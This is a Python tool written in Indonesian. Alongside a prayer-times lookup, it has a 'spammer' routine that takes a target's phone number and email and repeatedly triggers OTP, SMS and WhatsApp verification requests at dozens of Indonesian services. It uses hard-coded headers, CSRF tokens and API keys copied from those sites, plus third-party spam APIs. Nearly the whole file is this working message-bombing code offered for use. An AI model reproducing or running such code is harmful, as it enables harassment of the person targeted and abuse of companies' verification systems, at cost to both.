try:
	import os,sys,time,requests,json,re,random,itertools,threading
	from colorama import Fore,Back,init
except ModuleNotFoundError:
        print ("Install Module Dahulu")

B = Fore.BLUE
W = Fore.WHITE
R = Fore.RED
G = Fore.GREEN
BL = Fore.BLACK
Y = Fore.YELLOW

try:
	ip=requests.get('https://api.ipify.org').text
	ua=requests.get('http://xenzi-ganz.6te.net/User-Agent.php').text
	localtime=time.asctime(time.localtime(time.time()))
except requests.exceptions.ConnectionError:
        sys.exit(f"{W}Koneksi Tidak Stabil [{R}!{W}]")

id = []
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' 
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
warna = random.choice([
'\x1b[1;91m',
'\x1b[1;92m',
'\x1b[1;93m',
'\x1b[1;94m',
'\x1b[1;95m',
'\x1b[1;96m'
])

Hijau="\033[1;92m "
putih="\033[1;97m"
abu="\033[1;90m"
kuning="\033[1;93m"
ungu="\033[1;95m"
merah="33[37;1m"
biru="\033[1;96m"
#Tulisan Background Merah
bg="\033[1;0m\033[1;41mText\033[1;0m"

hah=(f"{W}Menyepam Dalam ")
xit=("Exited In ")

def load():
	load = '█'
	count = 0
	for t in range(6):
	    time.sleep(1)
	    print(f'\r{W}Coldown {R}{t}', end='', flush=True)
	    count += 1
	    if count == 1:
	    	count = 0
	    	load += '█'

def down(time_sec):
        while time_sec:
                mins, secs = divmod(time_sec,60)
                timeformat = xit+'\033[1;93m(\033[1;92m{:02d}:{:02d}\033[1;93m)'.format(mins,secs)
                print(timeformat,end='\r')
                time.sleep(1)
                time_sec -= 1
        print (f"{W}Thanks For Use Tools ({biru}^{W}_{biru}^{W})")
        time.sleep(5)

def countdown(time_sec):
	try:
		while time_sec:
			mins, secs = divmod(time_sec,60)
			timeformat = hah+'\033[1;93m(\033[1;92m{:02d}:{:02d}\033[1;93m)'.format(mins,secs)
			print(timeformat,end='\r')
			time.sleep(1)
			time_sec -= 1
		print (f"{W}[{R}•{W}] Starting Spam{abu}....")
		time.sleep(5)
	except KeyboardInterrupt:
                print (f"{W}Program Terminated [{R}!{W}]")

def sholat_bree():
	try:
		kota = input(f'{W}[{Y}•{W}] Nama Kota{R}:{G} ')
		tgl = input(f"{W}[{Y}•{W}] Sekarang Tanggal{R}:{G}")
		thn = input(f"{W}[{Y}•{W}] Sekarang Tahun{R}:{G}")
		bln = input(f"{W}[{Y}•{W}] Sekarang Bulan ke{R}:{G}")
		print()
		respon = requests.get('https://api.myquran.com/v1/sholat/kota/cari/%s' % (kota)).text
		respon1 = json.loads(respon)
		for respon2 in respon1['data']:
			try:
				print(f'{W}[{Y}•{W}] \x1b[1;97mLokasi \x1b[1;91m: \x1b[1;97m%s \x1b[1;91m| \x1b[1;97mid \x1b[1;91m: \x1b[1;92m%s ' % (respon2['lokasi'],respon2['id']))
				id.append(respon2['id'])
			except:continue
		print(f'{W}[{Y}•{W}] \x1b[1;97mTotal id \x1b[1;91m: \x1b[1;92m%s' % (len(id)))
		print(f'\n{W}[{Y}•{W}] \x1b[1;97mPilih Id Di Atas Dan Masukan id di bawah')
		cek_kota = input(f'{W}[{Y}•{W}] \x1b[1;97mMasukan Id\x1b[1;91m:\x1b[1;92m ')
		respon3 = requests.get('https://api.myquran.com/v1/sholat/jadwal/%s/2022/03/24' % (cek_kota)).text
		respon4 = json.loads(respon3)['data']
		print(f'{W}[{Y}•{W}] %sId       %s: %s%s' % (P,M,H,respon4['id']))
		print(f'{W}[{Y}•{W}] %sLokasi   %s: %s%s' % (P,M,H,respon4['lokasi']))
		print(f'{W}[{Y}•{W}] %sProvinsi %s: %s%s' % (P,M,H,respon4['daerah']))
		respon4 = requests.get(f'https://api.myquran.com/v1/sholat/jadwal/%s/{thn}/{bln}/{tgl}' % (cek_kota)).text
		respon5 = json.loads(respon4)['data']['jadwal']
		print(f'{W}[{Y}•{W}] %sTanggal  %s: %s%s' % (P,M,H,respon5['tanggal']))
		print(f'{W}[{Y}•{W}] %sImsak    %s: %s%s' % (P,M,H,respon5['imsak']))
		print(f'{W}[{Y}•{W}] %sSubuh    %s: %s%s' % (P,M,H,respon5['subuh']))
		print(f'{W}[{Y}•{W}] %sTerbit   %s: %s%s' % (P,M,H,respon5['terbit']))
		print(f'{W}[{Y}•{W}] %sDhuha    %s: %s%s' % (P,M,H,respon5['dhuha']))
		print(f'{W}[{Y}•{W}] %sDzuhur   %s: %s%s' % (P,M,H,respon5['dzuhur']))
		print(f'{W}[{Y}•{W}] %sAshar    %s: %s%s' % (P,M,H,respon5['ashar']))
		print(f'{W}[{Y}•{W}] %sMaghrib  %s: %s%s' % (P,M,H,respon5['maghrib']))
		print(f'{W}[{Y}•{W}] %sIsya     %s: %s%s' % (P,M,H,respon5['isya']))
		print(f'{W}[{Y}•{W}] %sDate     %s: %s%s' % (P,M,H,respon5['date']))
		print()
		ulang()
	except KeyError:
		print (f"{W}Tidak Ada Nama Kota {kota} {W}[{R}!{W}]")
		sholat_bree()
	except KeyboardInterrupt:
		print (f"{W}Program Terminated [{R}!{W}]")

def ulang():
	ulng=input(f"{R}•>{W} Main Lagi? {R}({W}Y{Y}/{W}N{R}){W}:")
	if ulng == "Y" or ulng == "y":
		os.system("python /sdcard/run.py")
	if ulng == "N" or ulng == "n":
		print (f"{W}Thanks For Use Tools ({biru}^{W}_{biru}^{W})")

def spammer():
	try:
		nomor=input(f"{R}->{W} Target Number {R}:{W} ")
		mail=input(f"{R}->{W} Target Email {R}:{W} ")
		jumlah=int(input(f"{R}->{W} Jumlah Spam {R}:{W}"))
		countdown(10)
		for i in range(int(jumlah)):
			heading = {"Host":"evermos.com","accept":"application/json, text/plain, */*","user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","content-type":"application/json;charset=UTF-8","origin":"https://evermos.com","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://evermos.com/registration/otp","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			ammarganz=json.dumps({"phone":"62"+nomor})
			req=requests.post("https://evermos.com/api/register/phone-registration",headers=heading,data=ammarganz).text
			req=requests.post("https://evermos.com/api/register/phone-registration",headers=heading,data=ammarganz).text
			req=requests.post("https://evermos.com/api/register/phone-registration",headers=heading,data=ammarganz).text
			AmmarGamteng=requests.post("https://www.olx.co.id/api/auth/authenticate",data=json.dumps({"grantType": "retry","method": "wa","phone":"62"+nomor,"language": "id"}), headers={"accept": "*/*","x-newrelic-id": "VQMGU1ZVDxABU1lbBgMDUlI=","x-panamera-fingerprint": "83b09e49653c37fb4dc38423d82d74d7#1597271158063","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36","content-type": "application/json"}).text
			AmmarGanz=requests.post("https://www.olx.co.id/api/auth/authenticate",data=json.dumps({"grantType": "retry","method": "sms","phone":"62"+nomor,"language": "id"}), headers={"accept": "*/*","x-newrelic-id": "VQMGU1ZVDxABU1lbBgMDUlI=","x-panamera-fingerprint": "83b09e49653c37fb4dc38423d82d74d7#1597271158063","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36","content-type": "application/json"}).text
			AmmarBN ={"Host":"beryllium.mapclub.com","content-type":"application/json","accept-language":"en-US","accept":"application/json, text/plain, */*","user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","origin":"https://www.mapclub.com","sec-fetch-site":"same-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://www.mapclub.com/","accept-encoding":"gzip, deflate, br"}
			wkwk=json.dumps({"account":nomor})
			req = requests.post("https://beryllium.mapclub.com/api/member/registration/sms/otp",headers=AmmarBN,data=wkwk).text
			kepala={"Host":"m.redbus.id","user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","accept":"*/*","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://m.redbus.id/","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",}
			gw=requests.get("https://m.redbus.id/api/getOtp?number="+nomor+"&cc=62&whatsAppOpted=true&disableOtpFlow=undefined",headers=kepala).text
			headers = {'Connection' : 'keep-alive','Accept' : 'application/json, text/javascript, */*; q=0.01','Origin' : 'https://accounts.tokopedia.com','X-Requested-With' : 'XMLHttpRequest','User-Agent' : '{acak}','Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8','Accept-Encoding' : 'gzip, deflate',}
			site = requests.get('https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn=0'+nomor+'&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D{}%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D', headers = headers).text
			search = re.search(r'\<input\ id\=\"Token\"\ value\=\"(.*?)\"\ type\=\"hidden\"\>', site).group(1)
			datap = {'otp_type' : '116','msisdn' : '0'+nomor,'tk' : search,'email' : '','original_param' : '','user_id' : '','signature' : '',}
			sending = requests.post('https://accounts.tokopedia.com/otp/c/ajax/request-wa', headers = headers, data = datap)
			Xen=requests.get("https://m.redbus.id/api/getOtp?number=0"+nomor+"&cc=62&whatsAppOpted=true",headers={"user-agent":"Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36"}).text
			req=requests.post("https://nuubi.herokuapp.com/api/spam/alodok", data={"number":nomor}).text
			ua={"Host":"auth.sampingan.co","domain-name":"auth-svc","app-auth":"Skip","content-type":"application/json; charset=UTF-8","user-agent":"okhttp/4.9.1","accept":"application/vnd.full+json","accept":"application/json","content-type":"application/vnd.full+json","content-type":"application/json","app-version":"2.1.2","app-platform":"Android"}
			data=json.dumps({"channel":"WA","country_code":"+62","phone_number":nomor})
			req=requests.post("https://auth.sampingan.co/v1/otp",data=data,headers=ua).text
			requests.post("https://api.bukuwarung.com/api/v1/auth/otp/send",headers={"Accept":"application/json","X-APP-VERSION-NAME":"3.4.0","X-APP-VERSION-CODE":"3399","Content-Type":"application/json; charset=UTF-8","Host":"api.bukuwarung.com","Connection":"Keep-Alive","Accept-Encoding":"gzip","User-Agent":"Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36"},json={"action":"LOGIN_OTP","countryCode":"62","deviceId":"00000177-142d-f1a2-bac4-57a9039fdc4d","method":"WA","phone":"0"+nomor}).text
			Xen=requests.post('https://wong.kitabisa.com/register/draft',headers={'Host': 'wong.kitabisa.com','x-ktbs-platform-name': 'pwa','version': '3.4.0','x-ktbs-time': '1648203783','user-agent': 'Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36','content-type': 'application/x-www-form-urlencoded','x-ktbs-api-version': '1.0.0','accept': 'application/json','x-ktbs-client-name': 'kanvas','x-ktbs-client-version': '1.0.0','x-ktbs-request-id': '06ae8851-e195-41b3-96cb-688edef890cb','save-data': 'on','x-ktbs-signature': 'e722d9d654ab5f7b68801deaa251d80171f2729651a5ac52ca8ddee074e8f286'},json={"full_name":"Xenzi Ganz","username":"0"+nomor,"otp_type":"whatsapp"}).text
			Bn=requests.post("https://auth.sampingan.co/v1/otp",data=data,headers=ua).text
			requests.post("https://api.bukuwarung.com/api/v1/auth/otp/send",headers={"Accept":"application/json","X-APP-VERSION-NAME":"3.4.0","X-APP-VERSION-CODE":"3399","Content-Type":"application/json; charset=UTF-8","Host":"api.bukuwarung.com","Connection":"Keep-Alive","Accept-Encoding":"gzip","User-Agent":"Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36"},json={"action":"LOGIN_OTP","countryCode":"62","deviceId":"00000177-142d-f1a2-bac4-57a9039fdc4d","method":"WA","phone":"0"+nomor}).text
			Xen=requests.post('https://wong.kitabisa.com/register/draft',headers={'Host': 'wong.kitabisa.com','x-ktbs-platform-name': 'pwa','version': '3.4.0','x-ktbs-time': '1648203783','user-agent': 'Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36','content-type': 'application/x-www-form-urlencoded','x-ktbs-api-version': '1.0.0','accept': 'application/json','x-ktbs-client-name': 'kanvas','x-ktbs-client-version': '1.0.0','x-ktbs-request-id': '06ae8851-e195-41b3-96cb-688edef890cb','save-data': 'on','x-ktbs-signature': 'e722d9d654ab5f7b68801deaa251d80171f2729651a5ac52ca8ddee074e8f286'},json={"full_name":"Xenzi Ganz","username":"0"+nomor,"otp_type":"whatsapp"}).text
			spm=requests.get("https://ainxbot-sms.herokuapp.com/api/spamsms",params={"phone":nomor}).text
			dekoruma={"Host":"auth.dekoruma.com","save-data":"on","user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","content-type":"application/json","accept":"*/*","origin":"https://m.dekoruma.com","sec-fetch-site":"same-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://m.dekoruma.com/","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			dekor=json.dumps({"phoneNumber":"+62"+nomor,"platform":"sms"})
			dekor2=requests.post("https://auth.dekoruma.com/api/v1/register/request-otp-phone-number/?format=json",headers=dekoruma,data=dekor).text
			jenius=requests.post("https://api.btpn.com/jenius", json.dumps({"query": "mutation registerPhone($phone: String!,$language: Language!) {\n  registerPhone(input: {phone: $phone,language: $language}) {\n    authId\n    tokenId\n    __typename\n  }\n}\n","variables": {"phone":"+62"+nomor,"language": "id"},"operationName": "registerPhone"}),headers={"accept": "*/*","btpn-apikey": "f73eb34d-5bf3-42c5-b76e-271448c2e87d","version": "2.36.1-7565","accept-language": "id","x-request-id": "d7ba0ec4-ebad-4afd-ab12-62ce331379be","Content-Type": "application/json","Host": "api.btpn.com","Connection": "Keep-Alive","Accept-Encoding": "gzip","Cookie": "c6bc80518877dd97cd71fa6f90ea6a0a=24058b87eb5dac1ac1744de9babd1607","User-Agent": "okhttp/3.12.1"}).text
			payfaz=requests.post("https://api.payfazz.com/v2/phoneVerifications",data={"phone":"0"+nomor},headers={"Host": "api.payfazz.com", "content-length": "17", "accept": "*/*", "origin": "https://www.payfazz.com","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36", "content-type": "application/x-www-form-urlencoded; charset=UTF-8", "referer": "http://www.payfazz.com/register/BEN6ZF74XL", "accept-encoding": "gzip, deflate, br", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}).text
			xen8={'Host': 'www.halodoc.com','x-xsrf-token': '9F1AFC784408F11F0FCD3071E845FBEB52B13A6C8C5740172F9C526E0DCA9A69B37505EDB5FAF1C97C522F4B09AFCF2F7C89','sec-ch-ua-mobile': '?1','user-agent': 'Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36','content-type': 'application/json','accept': 'application/json, text/plain, */*','save-data': 'on','origin': 'https://www.halodoc.com','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en;q=0.8'}
			xen9=json.dumps({"phone_number": "+62"+nomor,"channel": "sms"})
			req4 = requests.post('https://www.halodoc.com/api/v1/users/authentication/otp/requests', headers=xen8,data=xen9).text
			xen6={'Host': 'www.alodokter.com','content-length': '33','x-csrf-token': 'UG8hv2kV0R2CatKLXYPzT1isPZuGHVJi8sjnubFFdU1YvsHKrmIyRz6itHgNYuuBbbgSsCmfJWktrsfSC9SaGA==','sec-ch-ua-mobile': '?1','user-agent': 'Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36','content-type': 'application/json','accept': 'application/json','save-data': 'on','origin': 'https://www.alodokter.com','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://www.alodokter.com/login-alodokter','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en;q=0.8'}
			xen7=json.dumps({"user": {"phone": "0"+nomor}})
			req3 = requests.post('https://www.alodokter.com/login-with-phone-number', headers=xen6,data=xen7).text
			pizza={'Host': 'api-prod.pizzahut.co.id','content-length': '157','x-device-type': 'PC','sec-ch-ua-mobile': '?1','x-platform': 'WEBMOBILE','x-channel': '2','content-type': 'application/json;charset=UTF-8','accept': 'application/json','x-client-id': 'b39773b0-435b-4f41-80e9-163eef20e0ab','user-agent': 'Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36','x-lang': 'en','save-data': 'on','x-device-id': 'web','origin': 'https://www.pizzahut.co.id','sec-fetch-site': 'same-site','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://www.pizzahut.co.id/','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en;q=0.8'}
			pizza2=json.dumps({  "email": "aldigg088@gmail.com",  "first_name": "Xenzi",  "last_name": "Wokwokw",  "password": "Aldi++\\/67",  "phone": "0"+nomor,  "birthday": "2000-01-02"})
			pizzahut=requests.post('https://api-prod.pizzahut.co.id/customer/v1/customer/register', headers=pizza,data=pizza2).text
			lummo={"Host":"api.tokko.io","accept-language":"id","user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","content-type":"application/json","accept":"*/*","origin":"https://web.lummoshop.com","sec-fetch-site":"cross-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://web.lummoshop.com/","accept-encoding":"gzip, deflate, br"}
			gas=json.dumps({"operationName":"generateOTP","variables":{"generateOtpInput":{"phoneNumber":"+62"+nomor,"hashCode":"","channel":"SMS","userType":"MERCHANT"}},"query":"mutation generateOTP($generateOtpInput: GenerateOtpInput!) {\n  generateOtp(generateOtpInput: $generateOtpInput) {\n    phoneNumber\n  }\n}\n"})
			gaskeun=requests.post("https://api.tokko.io/graphql",headers=lummo,data=gas).text
			oyo={"Host":"www.oyorooms.com","accept-language":"id","user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","content-type":"application/json","xsrf-token":"EQkWLkwz-wsOdxssltZ6pIkc9OAbnpVBea-A","access_token":"SFI4TER1WVRTakRUenYtalpLb0w6VnhrNGVLUVlBTE5TcUFVZFpBSnc=","accept":"*/*","origin":"https://www.oyorooms.com","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://www.oyorooms.com/login","accept-encoding":"gzip, deflate, br"}
			oyo2=json.dumps({"phone":nomor,"country_code":"+62","country_iso_code":"ID","nod":4,"send_otp":True,"devise_role":"Consumer_Guest"})
			oyony=requests.post("https://www.oyorooms.com/api/pwa/generateByPhone?locale=id",headers=oyo,data=oyo2).text
			ganz={"Host":"wapi.ruparupa.com","content-type":"application/json","accept":"application/json","user-agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Safari/537.36","user-platform":"desktop","x-frontend-type":"desktop","origin":"https://www.ruparupa.com","sec-fetch-site":"same-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://www.ruparupa.com/verification?page=otp-choices","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			gamteng=json.dumps({"phone":"0"+nomor,"action":"social-login","channel":"message","email":"","token":"","customer_id":"0","is_resend":0})
			aing=requests.post("https://wapi.ruparupa.com/auth/generate-otp",headers=ganz,data=gamteng).text
			jag2={"Host":"id.jagreward.com","Connection":"keep-alive","Accept":"*/*","User-Agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","Sec-Fetch-Site":"same-origin","Sec-Fetch-Mode":"cors","Sec-Fetch-Dest":"empty","Referer":"https://id.jagreward.com/member/register/","Accept-Encoding":"gzip, deflate, br","Accept-Language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			jag=requests.get("https://id.jagreward.com/member/verify-mobile/"+nomor+"/",headers=jag2).text
			Subs={"Host":"api.kredinesia.id","accept":"application/json, text/plain, */*","user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","content-type":"application/json;charset=UTF-8","origin":"https://www.kredinesia.id","sec-fetch-site":"same-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://www.kredinesia.id/","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",}
			subrek=json.dumps({"phone":nomor,"captcha":""})
			mar=requests.post("https://api.kredinesia.id/v1/login/verificationCode",headers=Subs,data=subrek).text
			AmmarGanz=requests.post("https://www.olx.co.id/api/auth/authenticate",data=json.dumps({"grantType": "retry","method": "sms","phone":"62"+nomor,"language": "id"}), headers={"accept": "*/*","x-newrelic-id": "VQMGU1ZVDxABU1lbBgMDUlI=","x-panamera-fingerprint": "83b09e49653c37fb4dc38423d82d74d7#1597271158063","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36","content-type": "application/json"}).text
			AmmarBN ={"Host":"beryllium.mapclub.com","content-type":"application/json","accept-language":"en-US","accept":"application/json, text/plain, */*","user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","origin":"https://www.mapclub.com","sec-fetch-site":"same-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://www.mapclub.com/","accept-encoding":"gzip, deflate, br"}
			wkwk=json.dumps({"account":nomor})
			req = requests.post("https://beryllium.mapclub.com/api/member/registration/sms/otp",headers=AmmarBN,data=wkwk).text
			dat={"Host":"api.indodana.com","accept":"application/json, text/plain, */*","user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","content-type":"application/json;charset=UTF-8","origin":"https://www.indodana.id","sec-fetch-site":"cross-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://www.indodana.id/","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			dat2=json.dumps({"email":mail})
			req=requests.post("https://api.indodana.com/services/athena/download-app/email",headers=dat,data=dat2).text
			moka={"Host":"service-goauth.mokapos.com","accept":"application/json, text/plain, */*","user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","content-type":"application/json;charset=UTF-8","origin":"https://backoffice.mokapos.com","sec-fetch-site":"same-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://backoffice.mokapos.com/","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			ata=json.dumps({"phone_number":"+62"+mail})
			gas=requests.post("https://service-goauth.mokapos.com/account/v1/verification/phone/send",headers=moka,data=ata).text
			olx={"Host":"www.olx.co.id","user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","content-type":"application/json","accept":"*/*","save-data":"on","origin":"https://www.olx.co.id","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://www.olx.co.id/","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			olx2=json.dumps({"grantType":"email","email":mail,"language":"id"})
			olx3=requests.post("https://www.olx.co.id/api/auth/authenticate",headers=olx,data=olx2).text
			shop={"Host":"api.tokko.io","accept-language":"id","sec-ch-ua-mobile":"?1","user-agent":"Mozilla/5.0 (Linux; Android 11; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","content-type":"application/json","x-tokko-api-client":"merchant_web","accept":"*/*","origin":"https://web.lummoshop.com","sec-fetch-site":"cross-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://web.lummoshop.com/","accept-encoding":"gzip, deflate, br"}
			shopn={"operationName":"generateOTP","variables":{"generateOtpInput":{"phoneNumber":"+62"+nomor,"hashCode":"","channel":"WHATSAPP","userType":"MERCHANT"}},"query":"mutation generateOTP($generateOtpInput: GenerateOtpInput!) {\n  generateOtp(generateOtpInput: $generateOtpInput) {\n    phoneNumber\n  }\n}\n"}
			shopm=requests.post("https://api.tokko.io/graphql",headers=shop,json=shopn).text
			heading = {"Host":"evermos.com","accept":"application/json, text/plain, */*","user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","content-type":"application/json;charset=UTF-8","origin":"https://evermos.com","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://evermos.com/registration/otp","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			ammarganz=json.dumps({"phone":"62"+nomor})
			req=requests.post("https://evermos.com/api/register/phone-registration",headers=heading,data=ammarganz).text
			req=requests.post("https://evermos.com/api/register/phone-registration",headers=heading,data=ammarganz).text
			req=requests.post("https://evermos.com/api/register/phone-registration",headers=heading,data=ammarganz).text
			AmmarGamteng=requests.post("https://www.olx.co.id/api/auth/authenticate",data=json.dumps({"grantType": "retry","method": "wa","phone":"62"+nomor,"language": "id"}), headers={"accept": "*/*","x-newrelic-id": "VQMGU1ZVDxABU1lbBgMDUlI=","x-panamera-fingerprint": "83b09e49653c37fb4dc38423d82d74d7#1597271158063","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36","content-type": "application/json"}).text
			AmmarGanz=requests.post("https://www.olx.co.id/api/auth/authenticate",data=json.dumps({"grantType": "retry","method": "sms","phone":"62"+nomor,"language": "id"}), headers={"accept": "*/*","x-newrelic-id": "VQMGU1ZVDxABU1lbBgMDUlI=","x-panamera-fingerprint": "83b09e49653c37fb4dc38423d82d74d7#1597271158063","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36","content-type": "application/json"}).text
			AmmarBN ={"Host":"beryllium.mapclub.com","content-type":"application/json","accept-language":"en-US","accept":"application/json, text/plain, */*","user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","origin":"https://www.mapclub.com","sec-fetch-site":"same-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://www.mapclub.com/","accept-encoding":"gzip, deflate, br"}
			wkwk=json.dumps({"account":nomor})
			req = requests.post("https://beryllium.mapclub.com/api/member/registration/sms/otp",headers=AmmarBN,data=wkwk).text
			kepala={"Host":"m.redbus.id","user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","accept":"*/*","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://m.redbus.id/","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",}
